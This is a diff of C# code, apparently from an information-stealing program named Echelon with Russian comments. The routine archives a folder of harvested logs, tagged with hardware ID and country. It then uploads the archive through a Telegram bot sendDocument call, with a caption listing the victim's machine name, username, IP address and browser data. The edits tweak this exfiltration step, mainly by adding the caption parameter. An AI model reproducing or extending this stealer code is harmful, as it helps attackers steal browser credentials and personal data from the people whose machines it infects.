@@ -112,17 +112,19 @@ namespace Echelon
             try
             {
 
-                // Пакуем в апхив с паролем (что бы не слили логи,если сольют то будут пидорами)
+                // Пакуем в апхив с паролем
                 string zipArchive = Help.dir + "\\" + Help.dateLog + "_" + Help.HWID + Help.CountryCOde() + ".zip";
                 using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
                 {
                     zip.ParallelDeflateThreshold = -1;
                     zip.UseZip64WhenSaving = Zip64Option.Always;
-                    zip.CompressionLevel = CompressionLevel.Default; // Задаем степень сжатия             
+                    zip.CompressionLevel = CompressionLevel.Default; // Задаем степень сжатия 
                     zip.AddDirectory(Help.collectionDir); // Кладем в архив содержимое папки с логом
-                    zip.Comment = "123 test";
                     zip.Save(zipArchive); // Сохраняем архив    
                 }
+
+
+
                 string byteArchive = zipArchive;
                 byte[] file = File.ReadAllBytes(byteArchive);
                 string url = string.Concat(new string[]
@@ -132,6 +134,7 @@ namespace Echelon
                     Program.Token,
                     "/sendDocument?chat_id=",
                     Program.ID,
+                    "&caption=" +
                     "\n👤 "+Environment.MachineName+"/" + Environment.UserName+
                     "\n🏴 IP: " +Help.IP+  Help.Country() +
                     "\n🌐 Browsers Data"  +
